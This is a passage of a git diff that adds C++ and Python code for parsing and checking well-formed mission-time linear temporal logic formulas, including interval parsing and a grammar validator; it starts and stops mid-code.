Binary_Temp_conn  Interval Wff \u2018)'\n+    if (Slice_char(wff, 0) == \"(\" and Slice_char(wff, len_wff-1) == \")\"){\n+        int left_count = 0;\n+        int right_count = 0;\n+\n+        int binary_conn_index = 1;\n+        for (binary_conn_index = 1; binary_conn_index <= len_wff-1; ++binary_conn_index){\n+            string c = Slice_char(wff, binary_conn_index);\n+\n+            if(c == \"(\"){\n+                ++left_count;\n+            }\n+\n+            if(c == \")\"){\n+                ++right_count;\n+            }\n+\n+            if(left_count == right_count and (Binary_Prop_conn_check(c) or Binary_Temp_conn_check(c))){\n+                break;\n+            }\n+        }\n+\n+        return binary_conn_index;\n+    }\n+\n+    else{\n+        string error_string = wff + \" does not have a primary binary connective.\\n\";\n+        throw invalid_argument(error_string);\n+        return -1;\n+    }\n+}\n+\n+\n+\/*\n+ * Returns the indices where the primary interval is in a given WFF.\n+ *\/\n+tuple<int, int, int> primary_interval(string wff){\n+    int len_wff = int(wff.length());\n+\n+    \/\/ Unary_Temp_conn  Interval  Wff\n+    if (Unary_Temp_conn_check(Slice_char(wff, 0))){\n+        int begin_interval = 1;\n+\n+        \/\/ Parse for comma_index\n+        int comma_index = begin_interval+1;\n+        while (Num_check(Slice(wff, begin_interval+1, comma_index)) and comma_index <= len_wff-1){\n+            ++comma_index;\n+        }\n+\n+        \/\/ Parse for end_interval\n+        int end_interval = comma_index+1;\n+        while (Num_check(Slice(wff, comma_index+1, end_interval)) and end_interval <= len_wff-1){\n+            ++end_interval;\n+        }\n+\n+        return make_tuple(begin_interval, comma_index, end_interval);\n+    }\n+\n+\n+    \/\/ \u2018(\u2018 Wff Binary_Temp_conn Interval Wff \u2018)\n+    int binary_conn_index = primary_binary_conn(wff);\n+    if (Binary_Temp_conn_check(Slice_char(wff, binary_conn_index))){\n+        int begin_interval = binary_conn_index+1;\n+\n+        \/\/ Parse for comma_index\n+        int comma_index = begin_interval+1;\n+        while (Num_check(Slice(wff, begin_interval+1, comma_index)) and comma_index <= len_wff-1){\n+            ++comma_index;\n+        }\n+\n+        \/\/ Parse for end_interval\n+        int end_interval = comma_index+1;\n+        while (Num_check(Slice(wff, comma_index+1, end_interval)) and end_interval <= len_wff-1){\n+            ++end_interval;\n+        }\n+\n+        return make_tuple(begin_interval, comma_index, end_interval);\n+    }\n+\n+   \n+    else{\n+        string error_string = wff + \" does not have a primary interval.\\n\";\n+        throw invalid_argument(error_string);\n+    }\n+}\n+\n+\n+\/*\n+ * Determines the minimum computation length needed for a given WFF to not have out-of-bounds behavior.\n+ *\/\n+int Comp_len(string wff){\n+    int len_wff = int(wff.length());\n+\n+    \/\/ Prop_var\n+    if (Prop_var_check(wff)){\n+        return 1;\n+    }\n+\n+    \/\/ Prop_cons\n+    if (Prop_cons_check(wff)){\n+        return 0; \n+    }\n+\n+    string c = Slice_char(wff, 0);\n+    \/\/ Unary_Prop_conn Wff\n+    if (Unary_Prop_conn_check(c)){\n+        string alpha = Slice(wff, 1, len_wff-1);\n+        return Comp_len(alpha);\n+    }\n+\n+    \/\/ Unary_Temp_conn  Interval  Wff\n+    if (Unary_Temp_conn_check(c)){\n+        tuple<int, int, int> interval = primary_interval(wff);\n+        int comma_index = get<1>(interval);\n+        int end_interval = get<2>(interval);\n+        int upperbound = stoi(Slice(wff, comma_index+1, end_interval-1));\n+        string alpha = Slice(wff, end_interval+1, len_wff-1);\n+        return upperbound + Comp_len(alpha); \n+    }\n+\n+    \/\/ '(' Assoc_Prop_conn \u2018[\u2018  Array_entry  \u2018]\u2019 ')'\n+    c = Slice_char(wff, 1);\n+    if (Assoc_Prop_conn_check(c)){\n+        \/\/ Parse through '[' wff_1 ',' wff_2 ',' ... ',' wff_n ']' entry-by-entry\n+        \/\/ and iteratively compute: return_value = max(Comp_len(wff_1), ..., Comp_len(wff_n))\n+        int begin_entry = 3;\n+        int return_value = 0;\n+        for (int end_entry = 3; end_entry <= len_wff-1; ++end_entry){\n+            if (Wff_check(Slice(wff, begin_entry, end_entry))){\n+                string alpha = Slice(wff, begin_entry, end_entry);\n+                int Comp1 = Comp_len(alpha);\n+\n+                \/\/ Take max of current return_value and Comp_len(alpha)\n+                if (return_value < Comp1){\n+                    return_value = Comp1;\n+                }\n+\n+                \/\/ Update begin_entry so it has index of the first char of the next entry.\n+                begin_entry = end_entry + 2;\n+            }\n+        }\n+\n+        return return_value;\n+    }\n+\n+    \/\/ \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019  |  \u2018(\u2018 Wff Binary_Temp_conn  Interval Wff \u2018)'\n+    int binary_conn_index = primary_binary_conn(wff);\n+    string binary_conn = Slice_char(wff, binary_conn_index);\n+\n+    \/\/ \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019\n+    if (Binary_Prop_conn_check(binary_conn)){\n+        string alpha = Slice(wff, 1, binary_conn_index-1); \n+        int Comp_alpha = Comp_len(alpha); \n+        string beta = Slice (wff, binary_conn_index+1, len_wff-2);\n+        int Comp_beta = Comp_len(beta);\n+\n+        return max(Comp_alpha, Comp_beta);\n+    }\n+\n+    \/\/ \u2018(\u2018 Wff Binary_Temp_conn  Interval Wff \u2018)'\n+    if (Binary_Temp_conn_check(binary_conn)){\n+        tuple<int, int, int> interval = primary_interval(wff);\n+        int comma_index = get<1>(interval);\n+        int end_interval = get<2>(interval);\n+        int upper_bound = stoi(Slice(wff, comma_index + 1, end_interval - 1));\n+\n+        string alpha = Slice(wff, 1, binary_conn_index-1);\n+        int Comp_alpha = Comp_len(alpha); \n+        string beta = Slice(wff, end_interval+1, len_wff-2);\n+        int Comp_beta = Comp_len(beta);\n+        \n+        return max((upper_bound-1) + Comp_alpha, upper_bound + Comp_beta);\n+    }\n+\n+    \n+    else{\n+        string error_string = wff + \" is not a well-formed formula.\\n\";\n+        throw invalid_argument(error_string);\n+    }\n+}\n+\n+bool find_string(vector<tuple<string, vector<string>>> v, string s) {\n+    bool in_vec = false;\n+    for (int i = 0; i < v.size(); ++i) {\n+        if (get<0>(v[i]) == s) {\n+            in_vec = true;\n+        }\n+    }\n+    return in_vec;\n+}\n+\n+\n+\n+\n+\/\/Nnf ->  ?( \u2018~\u2019) Prop_var | Prop_cons\n+\/\/                            | Unary_Temp_conn  Interval  Nnf\n+\/\/\n+\/\/                            | '(' Assoc_Prop_conn \u2018[\u2018  Nnf_Array_entry \u2018]\u2019 ')'\n+\/\/                                      | \u2018(\u2018 Nnf Binary_Prop_conn Nnf \u2018)\u2019\n+\/\/                                     | \u2018(\u2018 Nnf Binary_Temp_conn  Interval Nnf  \u2018)\u2019\n+\n+\/*\n+vector<tuple<string, vector<string>>> subformula_regex(string wff, int n) {\n+    vector<tuple<string, vector<string>>> formulas;\n+    string nnf = Wff_to_Nnf_clean(wff);\n+    int len_nnf = int(nnf.length());\n+    \n+    \/\/if ( \u2018~\u2019) Prop_var\n+    if (Slice_char(nnf, 0) == \"~\" and Prop_var_check(Slice(nnf, 1, len_nnf - 1))) {\n+        string prop_var = Slice(nnf, 1, len_nnf - 1);\n+        vector<string> prop_var_regex = reg(prop_var, n);\n+        tuple<string, vector<string>> prop_var_tuple = make_tuple(prop_var, prop_var_regex);\n+        formulas.push_back(prop_var_tuple);\n+        \n+        vector<string> nnf_regex = reg(nnf, n);\n+        tuple<string, vector<string>> nnf_tuple = make_tuple(nnf, nnf_regex);\n+        formulas.push_back(nnf_tuple);\n+        \/\/ Return formulas = (prop_var_tuple, nnf_tuple)\n+        return formulas;\n+    }\n+    \n+    \/\/if Prop_var | Prop_cons\n+    if (Prop_var_check(nnf) or Prop_cons_check(nnf)) {\n+        vector<string> regex = reg(nnf, n);\n+        tuple<string, vector<string>> regex_tuple = make_tuple(nnf, regex);\n+        formulas.push_back(regex_tuple);\n+        \/\/ Return formulas = (regex_tuple)\n+        return formulas;\n+    }\n+    \n+    \/\/recursion starts\n+    \n+    \/\/if Unary_Temp_conn  Interval  Nnf\n+    if (Unary_Temp_conn_check(Slice_char(nnf, 0))) {\n+        tuple<int, int, int> interval_tuple = primary_interval(nnf);\n+        int begin_interval = get<0>(interval_tuple);\n+        int colon_index = get<1>(interval_tuple);\n+        int end_interval = get<2>(interval_tuple);\n+        string interval = Slice(nnf, begin_interval, end_interval);\n+        int lower_bound = stoi(Slice(nnf, begin_interval+1, colon_index-1));\n+        int upper_bound = stoi(Slice(nnf, colon_index+1, end_interval-1));\n+        string alpha = Slice(nnf, end_interval+1, len_nnf-1);\n+        if (Interval_check(interval) and Nnf_check(alpha)) {\n+            \/\/# prop var of alpha == # prop var of unary_temp_conn interval alpha\n+            vector<tuple<string, vector<string>>> alpha_regex = subformula_regex(alpha, n);\n+            for (int i = 0; i < alpha_regex.size(); ++i) {\n+                tuple<string, vector<string>> alpha_regex_tuple = make_tuple(get<0>(alpha_regex[i]), get<1>(alpha_regex[i]));\n+                if (!find_string(formulas, get<0>(alpha_regex[i]))) {\n+                    formulas.push_back(alpha_regex_tuple);\n+                }\n+            }\n+                \n+            \n+            \n+            \/\/F interval alpha\n+            if (Slice_char(nnf, 0) == \"F\") {\n+                \n+                vector<string> nnf_regex_F = reg_F(get<1>(alpha_regex[alpha_regex.size()-1]), lower_bound, upper_bound, n);\n+                tuple<string, vector<string>> F_tuple = make_tuple(nnf, nnf_regex_F);\n+                formulas.push_back(F_tuple);\n+                \/\/ Return formulas = (alpha_regex_tuple, F_tuple)\n+                return formulas;\n+            }\n+            \n+            \/\/G interval alpha\n+            else if (Slice_char(nnf, 0) == \"G\") {\n+                vector<string> nnf_regex_G = reg_G(get<1>(alpha_regex[alpha_regex.size()-1]), lower_bound, upper_bound, n);\n+                tuple<string, vector<string>> G_tuple = make_tuple(nnf, nnf_regex_G);\n+                formulas.push_back(G_tuple);\n+                \/\/ Return formulas = (alpha_regex_tuple, G_tuple)\n+                return formulas;\n+            }\n+            else {\n+                string error_string = nnf + \" does not have a unary temp connective.\\n\";\n+                throw invalid_argument(error_string);\n+            }\n+        }\n+    }\n+    \n+    \n+    \/\/(&[p0, p1])\n+    \/\/if '(' Assoc_Prop_conn \u2018[\u2018  Nnf_Array_entry \u2018]\u2019 ')'\n+    if (Slice_char(nnf, 0) == \"(\" and Assoc_Prop_conn_check(Slice_char(nnf, 1)) and Slice_char(nnf, 2) == \"[\" and\n+        Nnf_Array_entry_check(Slice(nnf, 3, len_nnf-3)) and Slice(nnf, len_nnf-2, len_nnf-1) == \"])\") {\n+        \n+        int num_open_bracket = 1;\n+        int num_close_bracket = 0;\n+        int num_open_paren = 1;\n+        int num_close_paren = 0;\n+        string prop_con = Slice_char(nnf, 1);\n+        \/\/(&[p0,p1,p2])\n+        string alpha = \"\";\n+        for (int i = 3; i < len_nnf; ++i) {\n+            if (Slice_char(nnf, i) == \"]\") ++num_close_bracket;\n+            if (Slice_char(nnf, i) == \"[\") ++num_open_bracket;\n+            if (Slice_char(nnf, i) == \")\") ++num_close_paren;\n+            if (Slice_char(nnf, i) == \"(\") ++num_open_paren;\n+            \n+            \/\/concatenate alpha\n+            if (Slice_char(nnf, i) != \",\" && (Slice_char(nnf, i) != \"]\" || num_open_bracket != num_close_bracket)\n+                && (Slice_char(nnf, i) != \")\" || num_open_paren != num_close_paren)) {\n+                alpha += Slice_char(nnf, i);\n+            }\n+            \n+            else if (Slice_char(nnf, i) == \",\" || Slice_char(nnf, i) == \"]\") {\n+                \/\/(&[p1,p2,(p4R[0:1]p5)])\n+                if (Nnf_check(alpha) && (num_close_bracket == num_open_bracket || Slice_char(nnf, i) == \",\")) {\n+\/\/                    vector<string> alpha_regex = reg(alpha, n);\n+\/\/                    tuple<string, vector<string>> alpha_tuple = make_tuple(alpha, alpha_regex);\n+\/\/                    formulas.push_back(alpha_tuple);\n+                    vector<tuple<string, vector<string>>> alpha_regex = subformula_regex(alpha, n);\n+                    for (int i = 0; i < alpha_regex.size(); ++i) {\n+                        tuple<string, vector<string>> alpha_regex_tuple = make_tuple(get<0>(alpha_regex[i]), get<1>(alpha_regex[i]));\n+                        if (!find_string(formulas, get<0>(alpha_regex[i]))) {\n+                            formulas.push_back(alpha_regex_tuple);\n+                        }\n+                    }\n+\/\/                    vector<tuple<string, vector<string>>> alpha_regex = subformula_regex(alpha, n);\n+\/\/                    tuple<string, vector<string>> alpha_regex_tuple = make_tuple(alpha, get<1>(alpha_regex[0]));\n+\/\/                    formulas.push_back(alpha_regex_tuple);\n+                }\n+                alpha = \"\";\n+            }\n+        }\n+        \n+        vector<string> nnf_regex = reg(nnf, n);\n+        tuple<string, vector<string>> nnf_tuple = make_tuple(nnf, nnf_regex);\n+        formulas.push_back(nnf_tuple);\n+        \/\/return formulas = (alpha_tuple, ... , alpha_tuple, nnf_tuple)\n+        return formulas;\n+    }\n+    \n+    \/\/if \u2018(\u2018 Nnf Binary_Prop_conn Nnf \u2018)\u2019\n+    int binary_con_index = primary_binary_conn(nnf);\n+    string alpha = Slice(nnf, 1, binary_con_index-1);\n+    string beta = Slice(nnf, binary_con_index+1, len_nnf-2);\n+    if (Slice_char(nnf, 0) == \"(\" and  Nnf_check(alpha) and\n+        Binary_Prop_conn_check(Slice_char(nnf, binary_con_index)) and\n+        Nnf_check(beta) and Slice_char(nnf, len_nnf-1) == \")\") {\n+        \/\/# prop var of alpha,beta == # prop var of \u2018(\u2018 alpha Binary_Prop_conn beta \u2018)\u2019\n+        vector<tuple<string, vector<string>>> alpha_regex = subformula_regex(alpha, n);\n+        for (int i = 0; i < alpha_regex.size(); ++i) {\n+            tuple<string, vector<string>> alpha_regex_tuple = make_tuple(get<0>(alpha_regex[i]), get<1>(alpha_regex[i]));\n+            if (!find_string(formulas, get<0>(alpha_regex[i]))) {\n+                formulas.push_back(alpha_regex_tuple);\n+            }\n+        }\n+\/\/        vector<string> alpha_regex = reg(alpha, n);\n+\/\/        tuple<string, vector<string>> alpha_tuple = make_tuple(alpha, alpha_regex);\n+\/\/        formulas.push_back(alpha_tuple);\n+        vector<tuple<string, vector<string>>> beta_regex = subformula_regex(beta, n);\n+        for (int i = 0; i < beta_regex.size(); ++i) {\n+            tuple<string, vector<string>> beta_regex_tuple = make_tuple(get<0>(beta_regex[i]), get<1>(beta_regex[i]));\n+            if (!find_string(formulas, get<0>(beta_regex[i]))) {\n+                formulas.push_back(beta_regex_tuple);\n+            }\n+        }\n+        \n+\/\/        vector<string> beta_regex = reg(beta, n);\n+\/\/        tuple<string, vector<string>> beta_tuple = make_tuple(beta, beta_regex);\n+\/\/        formulas.push_back(beta_tuple);\n+        \n+        string binary_con = Slice_char(nnf, binary_con_index);\n+        \/\/(alpha v beta)\n+        if (binary_con == \"v\")  {\n+            vector<string> nnf_regex = join(get<1>(alpha_regex[alpha_regex.size()-1]), get<1>(beta_regex[alpha_regex.size()-1]), n);\n+            tuple<string, vector<string>> nnf_tuple = make_tuple(nnf, nnf_regex);\n+            formulas.push_back(nnf_tuple);\n+            \/\/ Return formulas = (alpha_tuple, beta_tuple, nnf_tuple)\n+            return formulas;\n+        }\n+        \n+        \/\/(alpha & beta)\n+        if (binary_con == \"&\") {\n+            vector<string> nnf_regex = set_intersect(get<1>(alpha_regex[alpha_regex.size()-1]), get<1>(beta_regex[alpha_regex.size()-1]), n);\n+            tuple<string, vector<string>> nnf_tuple = make_tuple(nnf, nnf_regex);\n+            formulas.push_back(nnf_tuple);\n+            \/\/ Return formulas = (alpha_tuple, beta_tuple, nnf_tuple)\n+            return formulas;\n+        }\n+        \n+        \/\/(alpha = beta)\n+        if (binary_con == \"=\") {\n+            vector<string> nnf_regex = reg(nnf, n);\n+            tuple<string, vector<string>> nnf_tuple = make_tuple(nnf, nnf_regex);\n+            formulas.push_back(nnf_tuple);\n+            \/\/ Return formulas = (alpha_tuple, beta_tuple, nnf_tuple)\n+            return formulas;\n+        }\n+        \n+        \/\/(alpha > beta)\n+        if (binary_con == \">\") {\n+            vector<string> nnf_regex = reg(nnf, n);\n+            tuple<string, vector<string>> nnf_tuple = make_tuple(nnf, nnf_regex);\n+            formulas.push_back(nnf_tuple);\n+            \/\/ Return formulas = (alpha_tuple, beta_tuple, nnf_tuple)\n+            return formulas;\n+        }\n+        \n+        return formulas;\n+        \n+    \n+    }\n+        \n+    \/\/if \u2018(\u2018 Nnf Binary_Temp_conn  Interval Nnf  \u2018)\u2019\n+    binary_con_index = primary_binary_conn(nnf);\n+    string binary_temp_con = Slice_char(nnf, binary_con_index);\n+    tuple<int, int, int> interval_tuple = primary_interval(nnf);\n+    int begin_interval = get<0>(interval_tuple);\n+    int colon_index = get<1>(interval_tuple);\n+    int end_interval = get<2>(interval_tuple);\n+    string interval = Slice(nnf, begin_interval, end_interval);\n+    int lower_bound = stoi(Slice(nnf, begin_interval+1, colon_index-1));\n+    int upper_bound = stoi(Slice(nnf, colon_index+1, end_interval-1));\n+    alpha = Slice(nnf, 1, binary_con_index-1);\n+    beta = Slice(nnf, end_interval+1, len_nnf-2);\n+    if (Slice_char(nnf, 0) == \"(\" and  Nnf_check(alpha) and\n+        Binary_Temp_conn_check(Slice_char(nnf, binary_con_index))\n+        and Interval_check(interval) and\n+        Nnf_check(beta) and Slice_char(nnf, len_nnf-1) == \")\") {\n+        \n+        vector<tuple<string, vector<string>>> alpha_regex = subformula_regex(alpha, n);\n+        for (int i = 0; i < alpha_regex.size(); ++i) {\n+            tuple<string, vector<string>> alpha_regex_tuple = make_tuple(get<0>(alpha_regex[i]), get<1>(alpha_regex[i]));\n+            if (!find_string(formulas, get<0>(alpha_regex[i]))) {\n+                formulas.push_back(alpha_regex_tuple);\n+            }\n+        }\n+\/\/        vector<string> alpha_regex = reg(alpha, n);\n+\/\/        tuple<string, vector<string>> alpha_tuple = make_tuple(alpha, alpha_regex);\n+\/\/        formulas.push_back(alpha_tuple);\n+        \n+        vector<tuple<string, vector<string>>> beta_regex = subformula_regex(beta, n);\n+        for (int i = 0; i < beta_regex.size(); ++i) {\n+            tuple<string, vector<string>> beta_regex_tuple = make_tuple(get<0>(beta_regex[i]), get<1>(beta_regex[i]));\n+            if (!find_string(formulas, get<0>(beta_regex[i]))) {\n+                formulas.push_back(beta_regex_tuple);\n+            }\n+        }\n+        \n+\/\/        vector<string> beta_regex = reg(beta, n);\n+\/\/        tuple<string, vector<string>> beta_tuple = make_tuple(beta, beta_regex);\n+\/\/        formulas.push_back(beta_tuple);\n+        \n+        if (binary_temp_con == \"U\") {\n+            vector<string> nnf_regex = reg_U(get<1>(alpha_regex[alpha_regex.size()-1]), get<1>(beta_regex[alpha_regex.size()-1]), lower_bound, upper_bound, n);\n+            tuple<string, vector<string>> nnf_tuple = make_tuple(nnf, nnf_regex);\n+            formulas.push_back(nnf_tuple);\n+            \/\/ Return formulas = (alpha_tuple, beta_tuple, nnf_tuple)\n+            return formulas;\n+        }\n+        \n+        if (binary_temp_con == \"R\") {\n+            vector<string> nnf_regex = reg_R(get<1>(alpha_regex[alpha_regex.size()-1]), get<1>(beta_regex[alpha_regex.size()-1]), lower_bound, upper_bound, n);\n+            tuple<string, vector<string>> nnf_tuple = make_tuple(nnf, nnf_regex);\n+            formulas.push_back(nnf_tuple);\n+            \/\/ Return formulas = (alpha_tuple, beta_tuple, nnf_tuple)\n+            return formulas;\n+        }\n+    }\n+        \n+    \n+    return formulas;\n+}\n+*\/\n+\/\/vector<tuple<string, vector<string>>> subformula_regex(string wff, int n)\n+\n+\ndiff --git a\/MLTL_brute_forcer\/MLTL wff.docx b\/MLTL_brute_forcer\/Python\/grammar.docx\nsimilarity index 51%\nrename from MLTL_brute_forcer\/MLTL wff.docx\nrename to MLTL_brute_forcer\/Python\/grammar.docx\nindex f5298d1..df937b0 100644\nBinary files a\/MLTL_brute_forcer\/MLTL wff.docx and b\/MLTL_brute_forcer\/Python\/grammar.docx differ\ndiff --git a\/MLTL_brute_forcer\/Python\/grammar.py b\/MLTL_brute_forcer\/Python\/grammar.py\nnew file mode 100644\nindex 0000000..5237145\n--- \/dev\/null\n+++ b\/MLTL_brute_forcer\/Python\/grammar.py\n@@ -0,0 +1,429 @@\n+from Custom_notation import *\n+\n+# This file implements the following Context-Free Grammar:\n+# For a well-formed mLTL formula,\n+\n+# Alphabet = { \u20180\u2019, \u20181\u2019, \u2026, \u20189\u2019, \u2018p\u2019, \u2018(\u2018, \u2018)\u2019, \u2018[\u2019, \u2018]\u2019, ':', \u2018,\u2019 ,\n+#                        \u2018T\u2019, \u2018!\u2019,\n+#                        \u2018~\u2019, \u2018F\u2019, \u2018G\u2019,\n+#                        \u2018v\u2019, \u2018&\u2019, \u2018=\u2019, \u2018>\u2019, \u2018U\u2019, \u2018R\u2019 }\n+\n+# Digit  ->  \u20180\u2019 | \u20181\u2019 | \u2026 |\u20199\u2019\n+# Num  ->  Digit Num |  Digit\n+# Interval  ->  \u2018[\u2019  Num \u2018:\u2019 Num \u2018]\u2019\n+# Prop_var  ->  \u2018p\u2019 Num\n+\n+# Prop_cons  ->  \u2018T\u2019 | \u2018!\u2019\n+# Unary_Prop_conn  ->  \u2018~\u2019\n+# Binary_Prop_conn  ->  \u2018v\u2019 | \u2018&\u2019 | \u2018=\u2019 | \u2018>\u2019\n+\n+# Assoc_Prop_conn -> \u2018v\u2019 | \u2018&\u2019 | \u2018=\u2019\n+# Array_entry -> Wff \u2018,\u2019 Array_entry  |  Wff\n+\n+# Unary_Temp_conn  ->  \u2018F\u2019 | \u2018G\u2019\n+# Binary_Temp_conn  ->  \u2018U\u2019 | \u2018R\u2019\n+\n+\n+# Wff ->  Prop_var | Prop_cons\n+#                  | Unary_Prop_conn Wff\n+# \t             | Unary_Temp_conn  Interval  Wff\n+\n+# \t             | '(' Assoc_Prop_conn \u2018[\u2018  Array_entry  ']' ')'\n+#                  | '(' Wff Binary_Prop_conn Wff ')'\n+#                  | '(' Wff Binary_Temp_conn  Interval Wff ')'\n+\n+\n+# The Prop constants: True, False are represented by: \u2018T\u2019, \u2018F\u2019.\n+# The Unary Prop connective: Negation is represented by: \u2018~\u2019.\n+# The Binary Prop connectives: Or, And, Iff, Implies are represented by: \u2018v\u2019, \u2018&\u2019, \u2018=\u2019, \u2018>\u2019.\n+\n+# The Unary Temp connectives: Eventually, Always are represented by: \u2018F\u2019, \u2018G\u2019.\n+# The Binary Temp connectives: Until, Weak until are represented by: \u2018U\u2019, \u2018R\u2019.\n+\n+\n+\n+#  Digit  ->  \u20180\u2019 | \u20181\u2019 | \u2026 |\u20199\u2019\n+#  Checks that the inputted string is a digit.\n+def Digit_check(s : str):\n+    return s == \"0\" or s == \"1\" or s == \"2\" or s == \"3\" or s == \"4\" \\\n+                    or s == \"5\" or s == \"6\" or s == \"7\" or s == \"8\" or s == \"9\"\n+\n+\n+#  Num  ->  Digit Num |  Digit\n+#  Checks that the inputted string is of length 1 and then runs digit_check().  \n+def Num_check(s : str):\n+    len_s = len(s)\n+    if (len_s == 1):\n+        return Digit_check(s)\n+\n+    c = Slice_char(s, 0)\n+    alpha = Slice(s, 1, len_s-1)\n+    return Digit_check(c) and Num_check(alpha)\n+\n+\n+#  Interval  ->  \u2018[\u2019  Num \u2018,\u2019 Num \u2018]\u2019\n+#  Checks that the inputted string is of the form of an interval.\n+def Interval_check(s : str):\n+    len_s = len(s)\n+\n+    left_bracket = Slice_char(s, 0)\n+    right_bracket = Slice_char(s, len_s-1)\n+\n+    # Parse for comma index\n+    comma_index = 1\n+    while(Num_check(Slice(s, 1, comma_index)) and comma_index <= len_s-1):\n+        comma_index += 1\n+\n+    num_1 = Slice(s, 1, comma_index-1)\n+    comma = Slice_char(s, comma_index)\n+    num_2 = Slice(s, comma_index+1, len_s-2)\n+    return left_bracket == \"[\" and Num_check(num_1) and comma == \":\" \\\n+        and Num_check(num_2) and right_bracket == \"]\"\n+\n+\n+\n+#   Prop_var  ->  \u2018p\u2019 Num\n+#  Checks that the inputted string is a propositional variable.\n+ \n+def Prop_var_check(s : str):\n+    len_s = len(s)\n+\n+    c = Slice_char(s, 0)\n+    alpha = Slice(s, 1, len_s-1)\n+    return c == \"p\" and Num_check(alpha)\n+\n+\n+\n+#  Prop_cons  ->  \u2018T\u2019 | \u2018!\u2019\n+#  Checks that the inputted string is a propositional constant.\n+ \n+def Prop_cons_check(s : str):\n+    return s == \"T\" or s == \"!\"\n+\n+\n+\n+#   Unary_Prop_conn  ->  \u2018~\u2019\n+#   Checks that the inputted string is the negation symbol (the unary prop. connective).\n+ \n+def Unary_Prop_conn_check(s : str):\n+    return s == \"~\"\n+\n+\n+\n+#   Binary_Prop_conn  ->  \u2018v\u2019 | \u2018&\u2019 | \u2018=\u2019 | \u2018>\u2019\n+#   Checks that the inputted string is a binary prop. connective (or, and, equivalence, implication).\n+ \n+def Binary_Prop_conn_check(s : str):\n+    return s == \"v\" or s == \"&\" or s == \"=\" or s == \">\"\n+\n+\n+\n+#   Assoc_Prop_conn -> \u2018v\u2019 | \u2018&\u2019 | \u2018=\u2019\n+#   Checks that the inputted string is an associative prop. connective (or, and, equivalence).\n+ \n+def Assoc_Prop_conn_check(s : str):\n+    return s == \"v\" or s == \"&\" or s == \"=\"\n+\n+\n+#   Array_entry -> Wff \u2018,\u2019 Array_entry  |  Wff\n+#   Checks that the inputted string is an array of WFFs.\n+#   We use an array of WFFs, for example, when ANDing >2 formulas.\n+ \n+def Array_entry_check(s : str):\n+    len_s = len(s)\n+\n+    # Number of '(' in s\n+    left_count = 0\n+    # Number of ')' in s\n+    right_count = 0\n+\n+\n+    # Parse for comma_index in s\n+    # When left_count == right_count, we are done parsing and have found comma_index.\n+    for comma_index in Range(0, len_s-1, 1):\n+        c = Slice_char(s, comma_index)\n+\n+        if (c == \"(\"):\n+            left_count += 1\n+\n+        elif (c == \")\"):\n+            right_count += 1\n+\n+        # Done parsing for comma_index.\n+        if (left_count == right_count and c == \",\"):\n+            break\n+\n+    return (Wff_check(Slice(s, 0, comma_index-1)) and Slice_char(s, comma_index) == \",\" \\\n+        and Array_entry_check(Slice(s, comma_index+1, len_s-1))) or Wff_check(s)\n+\n+\n+\n+#   Unary_Temp_conn  ->  \u2018F\u2019 | \u2018G\u2019\n+#   Checks that the inputted string is F or G (the unary temporal connectives).\n+ \n+def Unary_Temp_conn_check(s : str):\n+    return s == \"F\" or s == \"G\"\n+\n+\n+\n+#   Binary_Temp_conn  ->  \u2018U\u2019 | \u2018R\u2019\n+#   Checks that the inputted string is U or R (the binary temporal connectives).\n+ \n+def Binary_Temp_conn_check(s : str):\n+    return s == \"U\" or s == \"R\"\n+\n+\n+\n+#  Wff ->  Prop_var | Prop_cons\n+#                   | Unary_Prop_conn Wff\n+#                   | Unary_Temp_conn  Interval  Wff\n+#                   | '(' Assoc_Prop_conn \u2018[\u2018  Array_entry  \u2018]\u2019 ')'\n+#                   | \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019\n+#                   | \u2018(\u2018 Wff Binary_Temp_conn  Interval Wff \u2018)\n+#   Checks that an inputted string is a WFF.\n+def Wff_check(s : str):\n+    len_s = len(s)\n+\n+    # Prop_var | Prop_cons\n+    if (Prop_var_check(s) or Prop_cons_check(s)):\n+        return True\n+\n+    # Unary_Prop_conn Wff\n+    if (Unary_Prop_conn_check(Slice_char(s, 0))):\n+        alpha = Slice(s, 1, len_s-1)\n+        return  Wff_check(alpha)\n+\n+    # Unary_Temp_conn  Interval  Wff\n+    if (Unary_Temp_conn_check(Slice_char(s, 0))):\n+        begin_interval = 1\n+        end_interval = 2\n+\n+        # Parse for end of interval\n+        while (Slice_char(s, end_interval) != \"]\" and end_interval <= len_s-1):\n+            end_interval = end_interval + 1\n+\n+        interval = Slice(s, begin_interval, end_interval)\n+        alpha = Slice(s, end_interval+1, len_s-1)\n+        return Interval_check(interval) and Wff_check(alpha)\n+\n+    # '(' Assoc_Prop_conn \u2018[\u2018  Array_entry  \u2018]\u2019 ')'\n+    if (Assoc_Prop_conn_check(Slice_char(s, 1))):\n+        begin_array = 2\n+        end_array = len_s-2\n+\n+        array_entry = Slice(s, begin_array+1, end_array-1)\n+        return Slice_char(s, 0) == \"(\" \\\n+            and Slice_char(s, 2) == \"[\" \\\n+            and Array_entry_check(array_entry) \\\n+            and Slice_char(s, len_s - 2) == \"]\" \\\n+            and Slice_char(s, len_s - 1) == \")\" \\\n+\n+    # \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019 | \u2018(\u2018 Wff Binary_Temp_conn Interval Wff \u2018)\n+    if (Slice_char(s, 0) == \"(\" and Slice_char(s, len_s-1) == \")\"):\n+\n+        # Number of '(' in s\n+        left_count = 0\n+        # Number of ')' in s\n+        right_count = 0\n+\n+\n+        #    Parse for binary_conn_index in s\n+\n+        #    When left_count == right_count and s[binary_conn_index] is a binary connective,\n+        #    we are done parsing and have found binary_conn_index.\n+\n+        for binary_conn_index in Range(1, len_s-1, 1):\n+            c = Slice_char(s, binary_conn_index)\n+\n+            if(c == \"(\"):\n+                left_count += 1\n+\n+            if(c == \")\"):\n+                right_count += 1\n+\n+            # Done parsing for binary_conn_index.\n+            if(left_count == right_count and (Binary_Prop_conn_check(c) or Binary_Temp_conn_check(c))):\n+                break\n+\n+        binary_conn = Slice_char(s, binary_conn_index)\n+\n+        # \u2018(\u2018 Wff Binary_Prop_conn Wff \u2018)\u2019\n+        if (Binary_Prop_conn_check(binary_conn)):\n+            alpha = Slice(s, 1, binary_conn_index-1)\n+            beta = Slice(s, binary_conn_index+1, len_s-2)\n+            return Wff_check(alpha) and Wff_check(beta)\n+\n+        # \u2018(\u2018 Wff Binary_Temp_conn Interval Wff \u2018)\n+        if (Binary_Temp_conn_check(binary_conn)):\n+            begin_interval = binary_conn_index+1\n+            end_interval = binary_conn_index+2\n+\n+            # Parse for end of interval\n+            while (Slice_char(s, end_interval) != \"]\" and end_interval 